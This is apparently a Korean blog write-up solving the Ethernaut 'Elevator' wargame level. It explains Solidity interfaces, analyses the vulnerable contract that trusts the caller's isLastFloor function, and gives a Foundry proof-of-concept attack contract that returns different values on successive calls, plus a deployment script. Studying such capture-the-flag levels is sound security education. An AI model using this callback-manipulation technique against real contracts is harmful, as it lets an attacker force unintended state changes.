# The Ethernaut : Elevator

> [Blog 원문](https://velog.io/@sane100400/The-Ethernaut-Elevator)

## 핵심 개념

### Interface (인터페이스)

"이 컨트랙트에는 이런 함수들이 있고, 이렇게 호출할 수 있습니다" — **함수 이름 + 매개변수 + 반환값**만 담고 있는 **약속**.

**특징:**
- 함수 선언만 존재, `{ ... }` 안에 구현 코드 없음
- 상태 변수에 값 저장 불가 (상수만 허용)
- constructor, `fallback`, `receive` 함수 사용 불가
- 상속하는 컨트랙트가 실제 구현을 제공해야 함

**장점:**
- 코드 의존성 감소
- 테스트용 mock 컨트랙트 생성 간편
- 구현 교체 용이 (같은 인터페이스 시그니처만 필요)

## 문제 컨트랙트

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

## 풀이 분석

1. `Building building = Building(msg.sender);` - 호출자의 주소를 `Building` 인터페이스로 취급
2. `if (!building.isLastFloor(_floor))` - **첫 번째 호출**: `false` 반환 시 블록 진입
3. `floor = _floor;` - `Elevator.floor` 설정
4. `top = building.isLastFloor(floor);` - **두 번째 호출**: 동일 매개변수로 다시 호출

**핵심 조건 2가지:**
1. 호출자가 `Building` 인터페이스를 매칭 함수 시그니처로 구현
2. `isLastFloor` 함수가 연속 호출 시 **다른 값을 반환**:
   - 첫 번째: `false` → if 블록 진입
   - 두 번째: `true` → `top = true` 설정

## PoC

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Elevator} from "../src/Elevator.sol";

contract Attack {
    Elevator public elevator;
    uint256 public lastfloor;

    constructor(address _target) {
        elevator = Elevator(_target);
    }

    function isLastFloor(uint256 floor) external returns (bool){
        if(floor == lastfloor){
            return true;
        } else {
            lastfloor = floor;
            return false;
        }
    }

    function attack(uint256 floor) external {
        elevator.goTo(floor);
    }
}

contract PoC is Script {
    address public target = 0xA1bA2A61091DA1a444356bB9bCF9B6A18D24bA3E;
    uint256 pk = vm.envUint("PRIV_KEY");

    function run() public {
        vm.startBroadcast(pk);
        Attack attack = new Attack(target);
        attack.attack(2);
        vm.stopBroadcast();
    }
}
```
